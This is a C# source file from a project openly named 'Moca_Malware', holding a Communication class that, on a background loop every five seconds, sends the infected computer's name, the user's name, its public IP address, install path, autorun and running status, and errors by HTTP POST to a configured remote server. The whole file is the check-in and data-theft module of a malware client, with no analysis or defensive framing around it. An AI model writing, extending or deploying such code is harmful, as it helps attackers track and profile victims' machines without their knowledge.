using System.Threading;

namespace Moca_Malware
{
    class Communication
    {
        private Thread communicationThread;
        public bool isCommunicating;

        public Communication()
        {
            this.communicationThread = new Thread(this.communicationLoop);
            this.communicationThread.Start();
            this.isCommunicating = true;
        }

        private void communicationLoop()
        {
            while (this.isCommunicating)
            {
                // Every 5 seconds
                Thread.Sleep(5000);

                // Sends Computer name
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_COMPUTER_NAME +
                    ComputerInformations.getComputerName());

                // Sends Username
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_USERNAME +
                    ComputerInformations.getUsername());

                // Sends IP Address
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_IP_ADDRESS +
                    ComputerInformations.getPublicIP());

                // Sends Installation path
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_INSTALLATION_PATH +
                    ComputerInformations.getApplicationPath());

                // Sends Is Installed
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_INSTALLED +
                    ComputerInformations.isInstalled());

                // Sends Startup
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_AUTORUN +
                    ComputerInformations.isStartup());

                // Sends Running
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_RUNNING +
                    ComputerInformations.isRunning());

                // Sends Error raised
                Network.httpPost(ServerConfiguration.SERVER_ADDRESS,
                    ServerConfiguration.POST_ERROR +
                    ErrorHandler.getError());
            }
        }
    }
}
